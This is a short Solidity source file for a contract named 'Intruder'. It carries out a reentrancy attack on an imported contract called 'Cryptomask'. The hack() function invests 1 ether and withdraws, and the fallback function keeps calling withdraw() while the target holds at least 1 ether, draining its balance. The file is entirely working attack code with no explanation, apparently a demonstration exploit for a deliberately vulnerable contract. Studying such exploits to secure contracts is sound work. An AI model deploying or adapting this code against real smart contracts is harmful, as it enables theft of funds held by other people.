// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "./Cryptomask.sol";

contract Intruder{

    Cryptomask public cryptomask;

    constructor(address _cryptomask){
        
        cryptomask=Cryptomask(_cryptomask);

    }

    fallback() external payable{
        if(address(cryptomask).balance >= 1 ether){
            cryptomask.withdraw();
        }
    }

     function hack() external payable{
         require(msg.value>=1 ether);
         cryptomask.invest{value: 1 ether}();
         cryptomask.withdraw();
        
     }    
}

